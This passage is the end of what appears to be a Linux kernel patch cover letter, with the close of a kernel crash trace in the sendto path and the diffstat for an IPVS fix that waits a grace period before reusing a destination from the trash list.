[  308.986271][    C2]  ? __sys_sendto+0x32e/0x3a0
[  308.986572][    C2]  __sys_sendto+0x32e/0x3a0
[  308.986867][    C2]  ? __pfx___sys_sendto+0x10/0x10
[  308.987209][    C2]  ? __pfx_lock_release+0x10/0x10
[  308.987549][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.987916][    C2]  ? rcu_is_watching+0x12/0xc0
[  308.988278][    C2]  __x64_sys_sendto+0xe0/0x1c0
[  308.988590][    C2]  ? do_syscall_64+0x93/0x270
[  308.988893][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.989272][    C2]  ? lockdep_hardirqs_on+0x7b/0x110
[  308.989610][    C2]  do_syscall_64+0xc7/0x270
[  308.989911][    C2]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  308.990291][    C2] RIP: 0033:0x7f17e42869ee
[  308.990586][    C2] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[  308.991801][    C2] RSP: 002b:00007f17e29e4c18 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  308.992340][    C2] RAX: ffffffffffffffda RBX: 00007f17e29e56c0 RCX: 00007f17e42869ee
[  308.992837][    C2] RDX: 0000000000000010 RSI: 00007f17e29e4c80 RDI: 000000000000013f
[  308.993340][    C2] RBP: 00007f17e29e4ca0 R08: 0000564422c722d0 R09: 0000000000000010
[  308.993832][    C2] R10: 0000000000000000 R11: 0000000000000246 R12: 00007f17e29e4c80
[  308.994331][    C2] R13: 0000564422c722d0 R14: 00007f17e29e4c90 R15: 0000000000000080
[  308.994856][    C2]  </TASK>
[  308.995264][    C2] Kernel Offset: disabled
[  308.995579][    C2] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Darong Lu

Darong Lu (1):
  ipvs: wait grace period while reusing dest from trash

 include/net/ip_vs.h            |   4 +-
 net/netfilter/ipvs/ip_vs_ctl.c | 109 ++++++++++++++++++++++++++++++++---------
 2 files changed, 90 insertions(+), 23 deletions(-)

-- 
2.53.0
